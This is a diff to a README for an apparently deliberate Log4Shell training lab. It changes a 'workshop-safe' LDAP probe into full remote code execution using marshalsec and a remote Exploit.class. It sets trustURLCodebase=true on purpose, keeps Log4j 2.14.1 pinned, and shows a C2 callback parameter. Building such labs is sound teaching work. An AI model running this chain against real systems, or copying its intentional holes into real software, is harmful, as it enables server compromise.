@@ -45,17 +45,22 @@ curl -s -X POST "http://HOST:8080/api/demo/critical-vm-compromise" \
   --data-urlencode "c2_callback=YOUR_IP:4444" | jq .
 ```
 
-### Log4Shell probe only (workshop-safe)
+### Log4Shell — full RCE (sandbox)
 
-1. Start a banner LDAP listener (no exploit payload served):
+**Probe only** (proves LDAP dial-out):
 
 ```bash
 python3 tools/ldap-listen.py --port 1389
 ```
 
-2. Open `/security`, set callback to `YOUR_IP:1389`, click **Run Log4Shell probe**.
+**Full RCE** (marshalsec LDAP + remote `Exploit.class`; VM runs with `trustURLCodebase=true` on purpose):
 
-3. The VM/Java process attempts outbound LDAP — that dial-out (+ SCA on `log4j-core:2.14.1`) is the demo signal.
+```bash
+./tools/setup-marshalsec.sh
+./tools/run-log4shell-ldap.sh --codebase-host YOUR_PUBLIC_IP
+```
+
+Then open `/security`, set LDAP callback to `YOUR_PUBLIC_IP:1389`, click **Run Log4Shell**. On success the VM gets `/tmp/jss-log4shell-rce` and `/tmp/jss-log4shell-id.txt`.
 
 You can also hit search with a crafted `User-Agent`:
 
@@ -139,13 +144,17 @@ First boot takes a few minutes while Maven builds on the instance. Then open `ht
 
 ```
 app/                     Spring Boot shop + /security Log4Shell UI
-tools/ldap-listen.py     Banner-only LDAP listener for demos
+tools/ldap-listen.py     Banner-only LDAP listener (dial-out proof)
+tools/run-log4shell-ldap.sh  Full RCE LDAP + HTTP codebase server
+tools/exploit/Exploit.java   Remote class payload for marshalsec
 scripts/install-vm.sh    Cloud-init / manual VM installer
 infrastructure/aws|azure|gcp
 ```
 
 ## Safety notes
 
-- Demo path **does not** ship a reverse-shell gadget; it triggers a **JNDI LDAP lookup** to a listener you control.
+- Demo path uses **marshalsec LDAPRefServer** + `tools/exploit/Exploit.class` for real Log4Shell RCE in isolated sandboxes.
+- JVM flag **`-Dcom.sun.jndi.ldap.object.trustURLCodebase=true`** is intentional (disabled by default on Java 11+).
+- Banner-only <code>ldap-listen.py</code> remains for LDAP dial-out proof without code execution.
 - Default firewalls allow `0.0.0.0/0` on 22/8080 — tighten `*_ingress_cidr` / source ranges for shared labs.
 - Pin stays on **Log4j 2.14.1** on purpose. Do not “fix” it without replacing the exercise.
